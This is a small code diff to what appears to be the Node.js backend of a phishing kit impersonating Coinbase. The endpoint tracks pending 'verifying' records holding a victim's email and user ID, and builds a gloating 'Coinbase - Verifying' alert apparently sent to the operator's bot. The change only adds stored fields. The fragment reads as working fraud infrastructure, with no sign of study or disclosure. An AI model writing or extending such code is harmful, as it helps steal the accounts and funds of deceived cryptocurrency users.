@@ -1898,8 +1898,7 @@ app.post("/send-verifying", async (req, res) => {
     console.log(`📧 Final displayEmail: ${displayEmail}`);
 
     // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
-    console.log(`💾 Stored verifyingId: ${verifyingId}`);
+    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, originalEmail: email, latestDisplayEmail: displayEmail, choice: null };
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
